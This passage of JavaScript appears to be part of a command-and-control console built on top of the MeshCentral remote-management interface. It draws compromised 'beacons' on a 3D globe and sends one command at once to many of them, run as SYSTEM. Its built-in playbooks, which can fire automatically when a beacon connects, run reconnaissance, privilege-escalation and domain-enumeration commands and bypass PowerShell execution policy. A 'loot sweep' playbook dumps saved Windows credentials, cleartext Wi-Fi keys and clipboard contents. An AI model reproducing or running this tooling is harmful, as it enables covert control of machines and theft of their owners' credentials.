            '  <div id="wtGlobeHint">drag to rotate &nbsp;|&nbsp; scroll to zoom</div>' +
            '</div>' +
            '<div id="wtGlobeRight">' +
            '  <div class="wt-globe-rh">' +
            '    <span>◈ BEACON LOCATIONS</span>' +
            '    <button id="wtGlobeRefreshBtn" class="wt-toolbar-btn" style="margin-left:auto">↺ REFRESH</button>' +
            '    <button id="wtGlobeCloseBtn" class="wt-toolbar-btn">✕</button>' +
            '  </div>' +
            '  <div id="wtGlobeBeaconList"></div>' +
            '</div>';
        anchor.parentNode.insertBefore(panel, anchor.nextSibling);
        panel.style.display = wtGlobeVisible ? 'flex' : 'none';
        document.getElementById('wtGlobeCloseBtn').onclick = function() {
            wtGlobeVisible = false;
            panel.style.display = 'none';
            var btn = document.getElementById('wtGlobeBtn');
            if (btn) btn.classList.remove('wt-toolbar-btn-active');
            if (wtGlobeAnimFrame) { cancelAnimationFrame(wtGlobeAnimFrame); wtGlobeAnimFrame = null; }
        };
        document.getElementById('wtGlobeRefreshBtn').onclick = function() { geolocateBeacons(); };
        ensureThreeJS(function() { initGlobe(); geolocateBeacons(); });
    }

    function ensureThreeJS(cb) {
        if (window.THREE) { cb(); return; }
        if (window._wtThreeLoading) {
            var poll = setInterval(function() { if (window.THREE) { clearInterval(poll); cb(); } }, 150);
            return;
        }
        window._wtThreeLoading = true;
        var s = document.createElement('script');
        // Load from local MeshCentral server first — no CDN dependency
        s.src = '/scripts/three.min.js';
        s.onload = function() { window._wtThreeLoading = false; cb(); };
        s.onerror = function() {
            // Local failed — try CDN fallback
            console.warn('[WT] Local three.min.js not found, trying CDN...');
            var s2 = document.createElement('script');
            s2.src = 'https://cdnjs.cloudflare.com/ajax/libs/three.js/r134/three.min.js';
            s2.onload = function() { window._wtThreeLoading = false; cb(); };
            s2.onerror = function() {
                window._wtThreeLoading = false;
                var el = document.getElementById('wtGlobeCanvas');
                if (el) el.parentNode.innerHTML = '<div style="display:flex;align-items:center;justify-content:center;height:100%;color:#ff3333;font-family:monospace;font-size:12px">[ THREE.JS LOAD FAILED — check /scripts/three.min.js ]</div>';
            };
            document.head.appendChild(s2);
        };
        document.head.appendChild(s);
    }

    function initGlobe() {
        if (wtGlobeInited || !window.THREE) return;
        // Defer one frame so the panel has fully painted and canvas has real dimensions
        requestAnimationFrame(function() { _doInitGlobe(); });
    }

    function _doInitGlobe() {
        if (wtGlobeInited || !window.THREE) return;
        wtGlobeInited = true;
        var canvas = document.getElementById('wtGlobeCanvas');
        if (!canvas) return;
        var left = document.getElementById('wtGlobeLeft');
        var W = (left ? left.clientWidth : canvas.clientWidth) || 680;
        var H = (left ? left.clientHeight : canvas.clientHeight) || 460;
        canvas.width = W;
        canvas.height = H;
        var THREE = window.THREE;

        // ── Renderer ──────────────────────────────────────────────
        wtGlobeRenderer = new THREE.WebGLRenderer({ canvas: canvas, antialias: true, alpha: true });
        wtGlobeRenderer.setPixelRatio(window.devicePixelRatio || 1);
        wtGlobeRenderer.setSize(W, H);
        wtGlobeRenderer.setClearColor(0x000000, 1);

        // ── Scene / Camera ─────────────────────────────────────────
        wtGlobeScene = new THREE.Scene();
        wtGlobeCamera = new THREE.PerspectiveCamera(45, W / H, 0.01, 1000);
        wtGlobeCamera.position.z = 2.6;

        // ── Stars background ───────────────────────────────────────
        var starCount = 3000;
        var starPos = new Float32Array(starCount * 3);
        for (var si = 0; si < starCount * 3; si++) starPos[si] = (Math.random() - 0.5) * 300;
        var starsGeo = new THREE.BufferGeometry();
        starsGeo.setAttribute('position', new THREE.BufferAttribute(starPos, 3));
        var starsMat = new THREE.PointsMaterial({ color: 0xffffff, size: 0.3, transparent: true, opacity: 0.7 });
        wtGlobeScene.add(new THREE.Points(starsGeo, starsMat));

        // ── Earth pivot (all globe geometry rotates together) ──────
        wtGlobePivot = new THREE.Group();
        wtGlobeScene.add(wtGlobePivot);

        // ── Earth textures ─────────────────────────────────────────
        var loader = new THREE.TextureLoader();
        loader.crossOrigin = '';
        var dayTex   = loader.load('/images/globe/earth-day.jpg');
        var nightTex = loader.load('/images/globe/earth-night.jpg');
        var specTex  = loader.load('/images/globe/earth-specular.png');

        // Day/Night blend shader — lit = day texture, dark side = city lights
        var earthMat = new THREE.ShaderMaterial({
            uniforms: {
                dayTexture:   { value: dayTex   },
                nightTexture: { value: nightTex },
                sunDirection: { value: new THREE.Vector3(1, 0.3, 1).normalize() }
            },
            vertexShader: [
                'varying vec3 vWorldNormal;',
                'varying vec2 vUv;',
                'void main() {',
                '  vWorldNormal = normalize((modelMatrix * vec4(normal, 0.0)).xyz);',
                '  vUv = uv;',
                '  gl_Position = projectionMatrix * modelViewMatrix * vec4(position, 1.0);',
                '}'
            ].join('\n'),
            fragmentShader: [
                'uniform sampler2D dayTexture;',
                'uniform sampler2D nightTexture;',
                'uniform vec3 sunDirection;',
                'varying vec3 vWorldNormal;',
                'varying vec2 vUv;',
                'void main() {',
                '  float d = dot(normalize(vWorldNormal), normalize(sunDirection));',
                '  float blend = smoothstep(-0.12, 0.22, d);',
                '  vec4 day   = texture2D(dayTexture,   vUv);',
                '  vec4 night = texture2D(nightTexture, vUv);',
                '  night.rgb *= 1.8;',           // boost city lights
                '  gl_FragColor = vec4(mix(night.rgb, day.rgb, blend), 1.0);',
                '}'
            ].join('\n')
        });
        var earthGeo  = new THREE.SphereGeometry(1, 64, 64);
        var earthMesh = new THREE.Mesh(earthGeo, earthMat);
        wtGlobePivot.add(earthMesh);
        wtGlobeEarthMat = earthMat;

        // ── Cloud layer (slower rotation) ─────────────────────────
        var cloudTex = loader.load('/images/globe/earth-clouds.jpg');
        var cloudGeo = new THREE.SphereGeometry(1.006, 64, 64);
        var cloudMat = new THREE.MeshPhongMaterial({
            map: cloudTex, transparent: true, opacity: 0.28,
            blending: THREE.AdditiveBlending, depthWrite: false
        });
        wtGlobeCloudMesh = new THREE.Mesh(cloudGeo, cloudMat);
        wtGlobePivot.add(wtGlobeCloudMesh);

        // ── Atmosphere glow ────────────────────────────────────────
        var atmGeo = new THREE.SphereGeometry(1.08, 48, 48);
        var atmMat = new THREE.MeshBasicMaterial({
            color: 0x4488ff, side: THREE.BackSide,
            transparent: true, opacity: 0.13
        });
        wtGlobeScene.add(new THREE.Mesh(atmGeo, atmMat));

        // ── Lighting ───────────────────────────────────────────────
        var sunLight = new THREE.DirectionalLight(0xffffff, 1.3);
        sunLight.position.set(5, 2, 5);
        wtGlobeScene.add(sunLight);
        wtGlobeScene.add(new THREE.AmbientLight(0x111133, 0.9));

        // ── Mouse controls ─────────────────────────────────────────
        canvas.addEventListener('mousedown', function(e) {
            wtGlobeDragging = true;
            wtGlobeDragStart = { x: e.clientX, y: e.clientY };
            wtGlobeRotStart  = { x: wtGlobeRotation.x, y: wtGlobeRotation.y };
        });
        window.addEventListener('mousemove', function(e) {
            if (!wtGlobeDragging) return;
            var dx = e.clientX - wtGlobeDragStart.x;
            var dy = e.clientY - wtGlobeDragStart.y;
            wtGlobeRotation.y = wtGlobeRotStart.y + dx * 0.008;
            wtGlobeRotation.x = Math.max(-1.4, Math.min(1.4, wtGlobeRotStart.x + dy * 0.008));
        });
        window.addEventListener('mouseup', function() { wtGlobeDragging = false; });
        canvas.addEventListener('wheel', function(e) {
            e.preventDefault();
            wtGlobeCamera.position.z = Math.max(1.3, Math.min(5.0, wtGlobeCamera.position.z + e.deltaY * 0.003));
        }, { passive: false });

        // ── Resize ─────────────────────────────────────────────────
        var resizeObs = new ResizeObserver(function() {
            if (!wtGlobeVisible) return;
            var w2 = left ? left.clientWidth : canvas.clientWidth;
            var h2 = left ? left.clientHeight : canvas.clientHeight;
            if (!w2 || !h2) return;
            canvas.width = w2; canvas.height = h2;
            wtGlobeRenderer.setSize(w2, h2);
            wtGlobeCamera.aspect = w2 / h2;
            wtGlobeCamera.updateProjectionMatrix();
        });
        resizeObs.observe(left || canvas);

        wtGlobeAnimate();
    }

    function wtGlobeAnimate() {
        if (!wtGlobeInited || !wtGlobeVisible) return;
        wtGlobeAnimFrame = requestAnimationFrame(wtGlobeAnimate);

        if (!wtGlobeDragging && wtGlobeAutoSpin) wtGlobeRotation.y += 0.0006;
        if (wtGlobePivot) {
            wtGlobePivot.rotation.x = wtGlobeRotation.x;
            wtGlobePivot.rotation.y = wtGlobeRotation.y;
        }
        // Clouds rotate slightly faster than globe
        if (wtGlobeCloudMesh) wtGlobeCloudMesh.rotation.y += 0.0002;

        // Pulse beacon dots
        var now = Date.now();
        Object.keys(wtGlobeBeaconDots).forEach(function(k) {
            var dot = wtGlobeBeaconDots[k];
            if (dot.ring) {
                var s = 1 + 0.4 * ((now * 0.0015 + dot.phase) % (Math.PI * 2) < Math.PI ? Math.sin(now * 0.0015 + dot.phase) : 0);
                dot.ring.scale.setScalar(s);
                dot.ring.material.opacity = 0.6 - 0.5 * ((s - 1) / 0.4);
            }
        });

        // Animate beams: grow → hold → fade
        var SPEED = 0.03;
        wtGlobeActiveBeams.forEach(function(beam) {
            if (!beam.active) return;
            beam.progress = Math.min(1, beam.progress + SPEED);
            var drawn = Math.floor(beam.progress * beam.totalPts) + 1;
            beam.line.geometry.setDrawRange(0, drawn);
            beam.glow.geometry.setDrawRange(0, drawn);
            // Move head particle along curve
            if (beam.head) {
                var t = Math.min(beam.progress, 0.999);
                var hp = beam.curve.getPoint(t);
                beam.head.position.copy(hp);
            }
            if (beam.progress >= 1) {
                beam.ttl = (beam.ttl !== undefined ? beam.ttl : 100) - 1;
                var a = Math.max(0, beam.ttl / 100);
                beam.line.material.opacity = a * 0.95;
                beam.glow.material.opacity = a * 0.3;
                if (beam.head) beam.head.material.opacity = a;
                if (beam.ttl <= 0) {
                    wtGlobePivot.remove(beam.line);
                    wtGlobePivot.remove(beam.glow);
                    if (beam.head) wtGlobePivot.remove(beam.head);
                    beam.active = false;
                }
            }
        });
        wtGlobeActiveBeams = wtGlobeActiveBeams.filter(function(b) { return b.active; });

        if (wtGlobeRenderer && wtGlobeScene && wtGlobeCamera)
            wtGlobeRenderer.render(wtGlobeScene, wtGlobeCamera);
    }

    function latLngToVec3(lat, lng, r) {
        var phi   = (90 - lat)  * Math.PI / 180;
        var theta = (lng + 180) * Math.PI / 180;
        return new window.THREE.Vector3(
            -r * Math.sin(phi) * Math.cos(theta),
             r * Math.cos(phi),
             r * Math.sin(phi) * Math.sin(theta)
        );
    }

    function addGlobeBeaconDot(nodeId, lat, lng, label, isServer) {
        if (!wtGlobePivot || !window.THREE) return;
        if (wtGlobeBeaconDots[nodeId]) wtGlobePivot.remove(wtGlobeBeaconDots[nodeId].group);
        var THREE = window.THREE;
        var pos   = latLngToVec3(lat, lng, 1.012);
        var color = isServer ? 0xff3333 : 0x00d4ff;
        var group = new THREE.Group();

        // Orient outward from globe center
        var outward = pos.clone().normalize();
        var up      = new THREE.Vector3(0, 1, 0);
        var quat    = new THREE.Quaternion().setFromUnitVectors(up, outward);
        group.setRotationFromQuaternion(quat);
        group.position.copy(pos);

        // Pin spike rising from surface
        var spikeH  = isServer ? 0.06 : 0.04;
        var spikeGeo = new THREE.CylinderGeometry(0.0015, 0.0015, spikeH, 6);
        var spikeMat = new THREE.MeshBasicMaterial({ color: color, transparent: true, opacity: 0.8,
            blending: THREE.AdditiveBlending, depthWrite: false });
        var spike = new THREE.Mesh(spikeGeo, spikeMat);
        spike.position.set(0, spikeH / 2, 0);
        group.add(spike);

        // Core dot at tip of spike
        var coreGeo = new THREE.SphereGeometry(isServer ? 0.016 : 0.011, 10, 10);
        var coreMat = new THREE.MeshBasicMaterial({ color: color,
            blending: THREE.AdditiveBlending, depthWrite: false });
        var core    = new THREE.Mesh(coreGeo, coreMat);
        core.position.set(0, spikeH, 0);
        group.add(core);

        // Pulsing ring (flat disc around tip)
        var ringGeo = new THREE.RingGeometry(0.01, 0.022, 16);
        var ringMat = new THREE.MeshBasicMaterial({ color: color, transparent: true, opacity: 0.6,
            side: THREE.DoubleSide, blending: THREE.AdditiveBlending, depthWrite: false });
        var ring    = new THREE.Mesh(ringGeo, ringMat);
        ring.position.set(0, spikeH, 0);
        group.add(ring);

        wtGlobePivot.add(group);
        wtGlobeBeaconDots[nodeId] = { group: group, ring: ring, phase: Math.random() * Math.PI * 2, lat: lat, lng: lng };
    }

    function addGlobeBeam(fromLat, fromLng, toLat, toLng, colorHex) {
        if (!wtGlobePivot || !window.THREE) return;
        var THREE = window.THREE;
        var p1  = latLngToVec3(fromLat, fromLng, 1.02);
        var p2  = latLngToVec3(toLat,   toLng,   1.02);
        var mid = new THREE.Vector3().addVectors(p1, p2).multiplyScalar(0.5);
        var dist = p1.distanceTo(p2);
        mid.normalize().multiplyScalar(1.0 + dist * 0.75);   // higher arc = more dramatic
        var curve = new THREE.QuadraticBezierCurve3(p1, mid, p2);
        var TOTAL = 80;
        var pts   = curve.getPoints(TOTAL);

        // Core beam line (bright, additive)
        var geo  = new THREE.BufferGeometry().setFromPoints(pts);
        geo.setDrawRange(0, 1);
        var mat  = new THREE.LineBasicMaterial({ color: colorHex, transparent: true, opacity: 0.95,
            blending: THREE.AdditiveBlending, depthWrite: false });
        var line = new THREE.Line(geo, mat);
        wtGlobePivot.add(line);

        // Glow halo (same geometry, wider apparent glow via opacity)
        var geoG = new THREE.BufferGeometry().setFromPoints(pts);
        geoG.setDrawRange(0, 1);
        var matG = new THREE.LineBasicMaterial({ color: colorHex, transparent: true, opacity: 0.28,
            blending: THREE.AdditiveBlending, depthWrite: false });
        var glow = new THREE.Line(geoG, matG);
        wtGlobePivot.add(glow);

        // Traveling head particle
        var headGeo = new THREE.SphereGeometry(0.012, 8, 8);
        var headMat = new THREE.MeshBasicMaterial({ color: colorHex, transparent: true, opacity: 1.0,
            blending: THREE.AdditiveBlending, depthWrite: false });
        var head = new THREE.Mesh(headGeo, headMat);
        head.position.copy(p1);
        wtGlobePivot.add(head);

        wtGlobeActiveBeams.push({ line: line, glow: glow, head: head, curve: curve,
            active: true, progress: 0, totalPts: TOTAL, ttl: 100 });
    }

    function wtFireGlobeBeam(nodeId, direction) {
        if (!wtGlobeVisible || !wtGlobeInited) return;
        var dot = wtGlobeBeaconDots[nodeId];
        if (!dot || !wtServerPos) return;
        var fromLat = direction === 'out' ? wtServerPos.lat : dot.lat;
        var fromLng = direction === 'out' ? wtServerPos.lng : dot.lng;
        var toLat   = direction === 'out' ? dot.lat  : wtServerPos.lat;
        var toLng   = direction === 'out' ? dot.lng  : wtServerPos.lng;
        addGlobeBeam(fromLat, fromLng, toLat, toLng, direction === 'out' ? 0x00d4ff : 0x00ff41);
    }

    function isPrivateIP(ip) {
        return !ip || ip === '127.0.0.1' ||
            !!ip.match(/^10\./) || !!ip.match(/^192\.168\./) ||
            !!ip.match(/^172\.(1[6-9]|2\d|3[01])\./);
    }

    function geolocateBeacons() {
        if (!window.nodes) return;
        var list = document.getElementById('wtGlobeBeaconList');
        if (list) list.innerHTML = '<div style="color:#4a5568;padding:8px;font-size:10px">Resolving locations…</div>';

        var privateNodes = [], pubNodes = [];
        for (var i = 0; i < window.nodes.length; i++) {
            var n = window.nodes[i];
            if (!n) continue;
            var ip = (n.ip || '').replace(/^::ffff:/, '').split(':')[0].trim();
            if (isPrivateIP(ip)) {
                privateNodes.push({ node: n, ip: ip });
            } else if (ip) {
                pubNodes.push({ node: n, ip: ip });
            }
        }

        if (!wtServerPos) wtServerPos = { lat: 51.5, lng: -0.1 };

        // Step 1: detect the network's real public IP (blank query = caller's IP)
        // then geolocate it — works even when the C2 server is on a LAN
        fetch('https://ip-api.com/json/?fields=status,lat,lon,query')
            .then(function(r) { return r.json(); })
            .then(function(geo) {
                if (geo && geo.status === 'success') {
                    wtServerPos = { lat: geo.lat, lng: geo.lon };
                } else {
                    // fallback: try geolocating the server hostname directly
                }
                placeServerAndPrivate(privateNodes);
            })
            .catch(function() {
                // If ip-api fails entirely, try geolocating the server hostname
                fetchGeo(window.location.hostname, function(geo) {
                    if (geo && geo.status === 'success') {
                        wtServerPos = { lat: geo.lat, lng: geo.lon };
                    }
                    placeServerAndPrivate(privateNodes);
                });
            });

        // Public-IP beacons geolocate independently
        geolocateBatch(pubNodes, 0, function() { renderGlobeBeaconList(); });
    }

    function placeServerAndPrivate(privateNodes) {
        // Place C2 server dot at resolved public location
        addGlobeBeaconDot('__server__', wtServerPos.lat, wtServerPos.lng, 'C2 SERVER', true);
        // Place private-IP beacons near server with small jitter
        privateNodes.forEach(function(item) {
            var jitter = function() { return (Math.random() - 0.5) * 2.5; };
            addGlobeBeaconDot(item.node._id,
                wtServerPos.lat + jitter(),
                wtServerPos.lng + jitter(),
                item.node.name, false);
        });
        renderGlobeBeaconList();
    }

    function geolocateBatch(items, idx, done) {
        if (idx >= items.length) { if (done) done(); return; }
        var item = items[idx];
        if (wtGeoCache[item.ip]) {
            var g = wtGeoCache[item.ip];
            addGlobeBeaconDot(item.node._id, g.lat, g.lng, item.node.name, false);
            geolocateBatch(items, idx + 1, done);
            return;
        }
        fetchGeo(item.ip, function(geo) {
            if (geo && geo.status === 'success') {
                wtGeoCache[item.ip] = { lat: geo.lat, lng: geo.lon, country: geo.country, city: geo.city };
                addGlobeBeaconDot(item.node._id, geo.lat, geo.lon, item.node.name, false);
            }
            setTimeout(function() { geolocateBatch(items, idx + 1, done); }, 220);
        });
    }

    function fetchGeo(ip, cb) {
        fetch('https://ip-api.com/json/' + ip + '?fields=status,lat,lon,country,city')
            .then(function(r) { return r.json(); })
            .then(cb)
            .catch(function() { cb(null); });
    }

    function renderGlobeBeaconList() {
        var list = document.getElementById('wtGlobeBeaconList');
        if (!list) return;
        var rows = '';
        for (var i = 0; i < (window.nodes || []).length; i++) {
            var n = window.nodes[i];
            if (!n) continue;
            var dot  = wtGlobeBeaconDots[n._id];
            var lat  = dot ? dot.lat.toFixed(2) : '?';
            var lng  = dot ? dot.lng.toFixed(2) : '?';
            var ip   = (n.ip || '').replace(/^::ffff:/, '').split(':')[0].trim() || '—';
            var conn = (n.conn & 1) ? 'active' : 'idle';
            rows +=
                '<div class="wt-globe-beacon-row" onclick="wtGlobeFocusBeacon(\'' + n._id + '\')">' +
                '<span class="wt-globe-status wt-globe-status-' + conn + '"></span>' +
                '<span class="wt-globe-bname">' + (n.name || 'Unknown') + '</span>' +
                '<span class="wt-globe-ip">' + ip + '</span>' +
                '<span class="wt-globe-coords">' + lat + ', ' + lng + '</span>' +
                '</div>';
        }
        list.innerHTML = rows || '<div style="color:#4a5568;padding:8px;font-size:10px">No beacons</div>';
    }

    window.wtGlobeFocusBeacon = function(nodeId) {
        var dot = wtGlobeBeaconDots[nodeId];
        if (!dot) return;
        wtGlobeRotation.y = -(dot.lng + 180) * Math.PI / 180 + Math.PI;
        wtGlobeRotation.x = -dot.lat * Math.PI / 180;
        wtGlobeAutoSpin = false;
        setTimeout(function() { wtGlobeAutoSpin = true; }, 6000);
    };

    function setupGlobe() {
        injectGlobeButton();
    }

    // ============================================================
    // SECTION 31: Multi-Beacon Broadcast
    // Fire one command to all checkbox-selected beacons simultaneously
    // via MeshCentral's native runcommands WebSocket action.
    // ============================================================
    var wtBcResults = [];

    function setupBroadcast() {
        // Hook MeshCentral's p1updateInfo — called every time a DeviceCheckbox toggles
        var _orig = window.p1updateInfo;
        window.p1updateInfo = function() {
            if (_orig) _orig.apply(this, arguments);
            wtUpdateBroadcastBar();
        };

        // Intercept meshserver.onmessage to capture per-node dispatch confirmations
        function hookMeshserver() {
            if (!window.meshserver || typeof meshserver.onmessage === 'undefined') {
                setTimeout(hookMeshserver, 600);
                return;
            }
            var _origMsg = meshserver.onmessage;
            meshserver.onmessage = function(ev) {
                if (_origMsg) _origMsg.apply(this, arguments);
                try {
                    var msg = (typeof ev.data === 'string') ? JSON.parse(ev.data) : ev.data;
                    if (msg && msg.action === 'runcommands' &&
                        msg.responseid && msg.responseid.indexOf('wt_bc_') === 0) {
                        wtHandleBroadcastResponse(msg);
                    }
                } catch(e) {}
            };
        }
        hookMeshserver();
        injectBroadcastBar();
    }

    function injectBroadcastBar() {
        if (document.getElementById('wtBroadcastBar')) return;
        var bar = document.createElement('div');
        bar.id = 'wtBroadcastBar';
        bar.className = 'wt-bc-bar';
        bar.style.display = 'none';
        bar.innerHTML =
            '<div class="wt-bc-left">' +
                '<span class="wt-bc-badge" id="wtBcCount">0</span>' +
                '<span class="wt-bc-label">BEACONS SELECTED</span>' +
                '<button class="wt-bc-clear" id="wtBcClearBtn">&#10005; CLEAR</button>' +
            '</div>' +
            '<div class="wt-bc-center">' +
                '<select id="wtBcType" class="wt-bc-select">' +
                    '<option value="1">CMD</option>' +
                    '<option value="2">PS</option>' +
                    '<option value="3">SHELL</option>' +
                '</select>' +
                '<input id="wtBcInput" class="wt-bc-input" type="text" ' +
                    'placeholder="command to broadcast to all selected beacons..." />' +
            '</div>' +
            '<div class="wt-bc-right">' +
                '<button class="wt-bc-fire" id="wtBcFireBtn">&#9889; BROADCAST</button>' +
            '</div>' +
            '<div class="wt-bc-results" id="wtBcResultsPane" style="display:none"></div>';

        // Insert right below the toolbar span
        var toolbar = document.getElementById('devListToolbarSpan');
        if (toolbar && toolbar.parentNode) {
            toolbar.parentNode.insertBefore(bar, toolbar.nextSibling);
        }

        document.getElementById('wtBcClearBtn').addEventListener('click', function() {
            if (typeof uncheckAllDevices === 'function') uncheckAllDevices();
            wtUpdateBroadcastBar();
        });

        document.getElementById('wtBcFireBtn').addEventListener('click', function() {
            var inp = document.getElementById('wtBcInput');
            if (inp && inp.value.trim()) wtFireBroadcast(inp.value.trim());
        });

        var bcInp = document.getElementById('wtBcInput');
        // Stop propagation on ALL key events so MeshCentral's global
        // keyboard handler doesn't swallow keystrokes in this input.
        ['keydown', 'keyup', 'keypress'].forEach(function(ev) {
            bcInp.addEventListener(ev, function(e) { e.stopPropagation(); });
        });
        bcInp.addEventListener('keydown', function(e) {
            if (e.key === 'Enter' && bcInp.value.trim()) wtFireBroadcast(bcInp.value.trim());
        });
    }

    function wtUpdateBroadcastBar() {
        var bar = document.getElementById('wtBroadcastBar');
        if (!bar) return;
        var ids = (typeof checkedNodeids !== 'undefined') ? Object.keys(checkedNodeids) : [];
        var n = ids.length;
        var badge = document.getElementById('wtBcCount');
        if (badge) badge.textContent = n;
        bar.style.display = n > 0 ? 'flex' : 'none';
        if (n === 0) {
            var pane = document.getElementById('wtBcResultsPane');
            if (pane) { pane.style.display = 'none'; pane.innerHTML = ''; }
            wtBcResults = [];
        }
    }

    function wtFireBroadcast(cmd) {
        var nodeids = (typeof getCheckedDevices === 'function') ? getCheckedDevices() : [];
        if (!nodeids.length || !cmd) return;

        var typeEl = document.getElementById('wtBcType');
        var type = typeEl ? (parseInt(typeEl.value) || 1) : 1;
        var typeLabel = { 1: 'CMD', 2: 'PS', 3: 'SHELL' }[type] || 'CMD';
        var responseid = 'wt_bc_' + Date.now();
        wtBcResults = [];

        // Build results pane — one row per target beacon
        var pane = document.getElementById('wtBcResultsPane');
        if (pane) {
            pane.style.display = 'block';
            var rows = nodeids.map(function(nid) {
                var node = (typeof getNodeFromId === 'function') ? getNodeFromId(nid) : null;
                var name = node ? (node.name || nid.split('/').pop().slice(0, 8)) : nid.split('/').pop().slice(0, 8);
                var bid  = nid.split('/').pop().slice(0, 8).toUpperCase();
                var key  = nid.replace(/[^a-zA-Z0-9]/g, '_');
                return '<div class="wt-bc-res-row">' +
                    '<span class="wt-beacon-id-badge" style="font-size:8px;padding:1px 4px;margin:0">' + bid + '</span>' +
                    '<span class="wt-bc-res-name">' + wtEsc(name) + '</span>' +
                    '<span class="wt-bc-res-status pending" id="wtBcStat_' + key + '">SENDING\u2026</span>' +
                '</div>';
            }).join('');
            pane.innerHTML =
                '<div class="wt-bc-res-hdr">&#9889; BROADCAST &nbsp;&middot;&nbsp; ' + typeLabel +
                ' &nbsp;&middot;&nbsp; ' + nodeids.length + ' TARGET' + (nodeids.length !== 1 ? 'S' : '') + '</div>' +
                rows;
        }

        // Fire via MeshCentral's native batch runcommands action
        try {
            meshserver.send({
                action:    'runcommands',
                nodeids:   nodeids,
                type:      type,
                cmds:      cmd,
                runAsUser: 0,
                responseid: responseid
            });
        } catch(e) {
            console.error('[WT Broadcast] send error:', e);
        }

        // Flash fire button orange
        var btn = document.getElementById('wtBcFireBtn');
        if (btn) {
            btn.style.background = 'rgba(255,140,0,0.5)';
            setTimeout(function() { btn.style.background = ''; }, 700);
        }

        // Log to OPS timeline
        if (typeof wtLogEvent === 'function') {
            wtLogEvent('CMD', '\u26a1 BROADCAST [' + typeLabel + '] \u2192 ' + nodeids.length +
                ' beacon' + (nodeids.length !== 1 ? 's' : '') + ': ' +
                cmd.slice(0, 60) + (cmd.length > 60 ? '\u2026' : ''));
        }

        // Save to quick-fire history
        if (typeof wtCmdHistory !== 'undefined') {
            wtCmdHistory.unshift(cmd);
            if (wtCmdHistory.length > 25) wtCmdHistory.length = 25;
            try { localStorage.setItem('wt_cmd_history_v1', JSON.stringify(wtCmdHistory)); } catch(e) {}
        }

        // Clear input
        var inp = document.getElementById('wtBcInput');
        if (inp) inp.value = '';
    }

    function wtHandleBroadcastResponse(msg) {
        // msg: { action:'runcommands', responseid:'wt_bc_...', result:'OK'|'...', nodeid?:... }
        var result = (msg.result || '').toUpperCase();
        var ok = (result === 'OK');

        if (msg.nodeid) {
            var key = msg.nodeid.replace(/[^a-zA-Z0-9]/g, '_');
            var el = document.getElementById('wtBcStat_' + key);
            if (el) {
                el.textContent = ok ? '\u2713 SENT' : '\u2717 ' + (msg.result || 'ERR');
                el.className = 'wt-bc-res-status ' + (ok ? 'ok' : 'fail');
            }
        } else {
            // No nodeid in response — mark all remaining pending rows as sent
            var pending = document.querySelectorAll('.wt-bc-res-status.pending');
            for (var i = 0; i < pending.length; i++) {
                pending[i].textContent = '\u2713 SENT';
                pending[i].className = 'wt-bc-res-status ok';
            }
        }
    }

    // ============================================================

    // ============================================================
    // SECTION 34: Automated Playbooks
    // Pre-defined multi-step command chains that can fire
    // automatically on beacon CONNECT or be triggered manually.
    // ============================================================
    var wtPlaybooks = [];
    var wtPlaybooksVisible = false;

    var WT_BUILTIN_PLAYBOOKS = [
        {
            id: 'builtin_quick_enum', name: 'QUICK ENUM',
            builtIn: true, autoFire: false,
            steps: [
                { label: 'whoami',   cmd: 'whoami /all',    delay: 0 },
                { label: 'sysinfo',  cmd: 'systeminfo',     delay: 2000 },
                { label: 'ipconfig', cmd: 'ipconfig /all',  delay: 5000 },
                { label: 'netstat',  cmd: 'netstat -an',    delay: 9000 }
            ]
        },
        {
            id: 'builtin_std_recon', name: 'STANDARD RECON',
            builtIn: true, autoFire: false,
            steps: [
                { label: 'identity',   cmd: 'whoami',                                                                                        delay: 0 },
                { label: 'net users',  cmd: 'net users',                                                                                     delay: 1500 },
                { label: 'processes',  cmd: 'tasklist /v',                                                                                   delay: 3000 },
                { label: 'schtasks',   cmd: 'schtasks /query /fo LIST',                                                                      delay: 5500 },
                { label: 'AV check',   cmd: 'powershell -ep bypass -c "Get-MpComputerStatus | Select AMRunningMode,AntivirusEnabled,RealTimeProtectionEnabled | fl"', delay: 8000 }
            ]
        },
        {
            id: 'builtin_privesc', name: 'PRIVESC CHECK',
            builtIn: true, autoFire: false,
            steps: [
                { label: 'whoami priv',  cmd: 'whoami /priv',                                                                                                                       delay: 0 },
                { label: 'local admins', cmd: 'net localgroup administrators',                                                                                                      delay: 1500 },
                { label: 'patches',      cmd: 'systeminfo | findstr /i "hotfix KB"',                                                                                               delay: 3500 },
                { label: 'UAC level',    cmd: 'reg query HKLM\\SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Policies\\System /v EnableLUA',                                        delay: 6000 }
            ]
        },
        {
            id: 'builtin_domain_enum', name: 'DOMAIN ENUM',
            builtIn: true, autoFire: false,
            steps: [
                { label: 'domain users',   cmd: 'net user /domain',                      delay: 0 },
                { label: 'domain admins',  cmd: 'net group "Domain Admins" /domain',     delay: 3000 },
                { label: 'trusts',         cmd: 'nltest /domain_trusts',                  delay: 6000 },
                { label: 'DCs',            cmd: 'nltest /dclist:',                        delay: 8000 }
            ]
        },
        {
            id: 'builtin_loot_sweep', name: 'LOOT SWEEP',
            builtIn: true, autoFire: false,
            steps: [
                { label: 'profile dir',   cmd: 'dir %USERPROFILE%',                                                                                                                  delay: 0 },
                { label: 'temp dir',      cmd: 'dir %TEMP%',                                                                                                                         delay: 1500 },
                { label: 'saved creds',   cmd: 'cmdkey /list',                                                                                                                       delay: 3000 },
                { label: 'wifi creds',    cmd: 'powershell -ep bypass -c "netsh wlan show profiles | Select-String \'All User Profile\' | % { $n=($_ -split \':\')[1].Trim(); (netsh wlan show profile name=$n key=clear | Select-String \'Key Content\') -replace \'.*:\\s*\',$n+\': \' }"', delay: 4500 },
                { label: 'clipboard',     cmd: 'powershell -ep bypass -c "Get-Clipboard"',                                                                                           delay: 6500 }
            ]
        }
    ];

    function loadPlaybookStore() {
        try { var r = localStorage.getItem('wt_playbooks_v1'); return r ? JSON.parse(r) : {}; } catch(e) { return {}; }
    }

    function savePlaybookStore() {
        var custom = wtPlaybooks.filter(function(p) { return !p.builtIn; });
        var biState = {};
        wtPlaybooks.filter(function(p) { return p.builtIn; }).forEach(function(p) {
            biState[p.id] = { autoFire: p.autoFire };
        });
        try { localStorage.setItem('wt_playbooks_v1', JSON.stringify({ custom: custom, biState: biState })); } catch(e) {}
    }

    function setupPlaybooks() {
        var saved  = loadPlaybookStore();
        var biState = saved.biState || {};
        var custom  = saved.custom  || [];
        wtPlaybooks = WT_BUILTIN_PLAYBOOKS.map(function(p) {
            var c = JSON.parse(JSON.stringify(p));
            if (biState[p.id]) c.autoFire = biState[p.id].autoFire;
            return c;
        }).concat(custom);

